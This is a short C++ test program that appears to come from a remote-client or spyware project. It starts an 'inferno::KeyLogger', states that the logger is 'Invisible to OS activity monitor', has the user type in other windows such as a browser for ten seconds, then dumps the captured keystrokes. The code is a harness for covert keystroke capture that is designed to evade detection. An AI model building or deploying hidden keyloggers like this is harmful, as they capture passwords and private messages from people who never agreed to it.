#include "../client/include/KeyLogger.hpp"
#include <iostream>
#include <thread>
#include <chrono>

int main() {
    std::cout << "\n🔥 Starting Manual Keylogger Test...\n";
    inferno::KeyLogger kl;
    kl.start();

    if (!kl.isRunning()) {
        std::cerr << "❌ Failed to start. Did you grant Accessibility permissions to your Terminal?\n\n";
        return 1;
    }

    std::cout << "✅ KeyLogger is active (Invisible to OS activity monitor).\n";
    std::cout << "⏱️  You have 10 seconds. Click on any window (browser, notes, etc.) and type something...\n\n";

    for (int i = 10; i > 0; --i) {
        std::cout << i << "... " << std::flush;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    kl.stop();
    std::cout << "\n\n🛑 KeyLogger stopped. Dumping intercepted buffer:\n";
    std::cout << "==========================================\n";
    std::cout << kl.dump() << "\n";
    std::cout << "==========================================\n";
    return 0;
}
